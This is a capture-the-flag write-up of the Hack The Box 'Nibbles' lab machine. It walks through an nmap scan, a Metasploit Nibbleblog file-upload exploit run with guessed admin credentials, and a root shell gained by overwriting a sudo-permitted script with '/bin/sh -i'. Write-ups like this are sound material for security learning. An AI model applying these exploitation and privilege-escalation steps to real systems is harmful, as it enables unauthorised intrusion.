---
layout: post
title:  "HTB Nibbles Machine Writeup"
date:   2020-1-2 00:10:00 +0000
categories: hackthebox
---
Another breezy box by hackthebox that we can fly through with metasploit.

# Nmap scan
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
|_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
```

# pwning user
Checking the web source will show us a comment leaking a running web service. Metasploit will do the rest.
```php
<!-- /nibbleblog/ directory. Nothing interesting here! -->
```
```
Module options (exploit/multi/http/nibbleblog_file_upload):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   PASSWORD   nibbles          yes       The password to authenticate with
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOST      10.10.10.75      yes       The target address
   RPORT      80               yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /nibbleblog/     yes       The base path to the web application
   USERNAME   admin            yes       The username to authenticate with
   VHOST                       no        HTTP server virtual host
```

# getting root
A quick sudo -l check will show us the route to root.
```
User nibbler may run the following commands on Nibbles:
    (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh
```
We can use su with monitor.sh without a password. We can echo a bash string into the script to force a root shell is returned.
```
echo '/bin/sh -i' > monitor.sh
sudo /home/nibbler/personal/stuff/monitor.sh
#
```


